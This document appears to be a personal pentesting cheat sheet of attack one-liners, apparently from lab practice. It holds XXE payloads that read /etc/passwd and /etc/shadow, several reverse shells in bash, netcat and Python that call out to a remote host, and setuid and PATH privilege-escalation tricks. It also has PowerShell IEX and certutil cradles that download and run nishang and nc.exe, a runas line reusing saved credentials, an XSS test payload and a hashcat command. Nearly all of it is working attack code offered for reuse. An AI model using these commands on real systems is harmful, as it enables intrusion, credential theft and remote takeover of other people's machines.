# This file is used to notedown the useful commands during pentesting. After that I arrange the commands
# accordingly in other files in this directory  



1. XXE:

<?xml  version="1.0" encoding="ISO-8859-1"?>                              
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
		<bugreport>
		<title>&ent;</title>
		<cwe>aaa</cwe>
		<cvss>aaa</cvss>

<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>




2. Capabilities search: `getcap -r / 2>/dev/null`


3. Python pty Shell: `python -c 'import pty;pty.spawn("/bin/bash")'`



4.Reverse shell : 

Bash : `/bin/bash -i 1>&/dev/tcp/10.10.14.5/1234 0<&1`

Netcat : `nc -e /bin/bash 10.10.14.5 4444`

Netcat(2) : `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.13 1234 >/tmp/f`

Python: 

`python -c 'import socket,subprocess,os;s=socket.socket( socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

5. Perl system command one liner: `sudo perl -e 'system("/bin/bash -p");'`


6. XSS : `<script>alert("XSS")</script>`

7. Find Setuid enabled Programs : `find / -perm -u=s -type f 2>/dev/null`

8. df - to see free disk space of all mounted devices

9. Hash cracking :`hashcat -m 7900 -a 0 hash /usr/share/wordlists/rockyou.txt --force`  

10. Connect to Mysql server from the victim : `mysql -u username -h localhost --password=userpassword -D databasename -e 'show tables;'`

perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

echo "import os;os.setuid(0);os.system('chmod u+s /bin/bash')" >test.py

Remember `echo "/bin/bash">file`  NOT  `cp /bin/bash ./file`

export PATH=/home/rabbit:$PATH  

1. mdb-tools for .mdb(MS Access) files
2. pst-utls for .pst files.
3. Download from  ftp in binary mode 


xxd -r -p key ssh.key

cat ~/.bash_history

powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.11:8000/nishang.ps1')
powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.13:8000/jaws-enum.ps1')
powershell IEX(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.13:8000/jaws-enum.ps1", "C:\\Users\\Public\\Downloads\\jaws-enum.ps1")

powershell IEX(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.11:8000/nc.exe","C:\\xampp\htdocs\gym\upload\nc.exe")

certutil -urlcache -split -f http://10.10.14.11:8000/nc.exe

net users Administrator

cmdkey /list

runas /user:Administrator /savecred "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.13:8000/nishang2.ps1')"

whoami /prev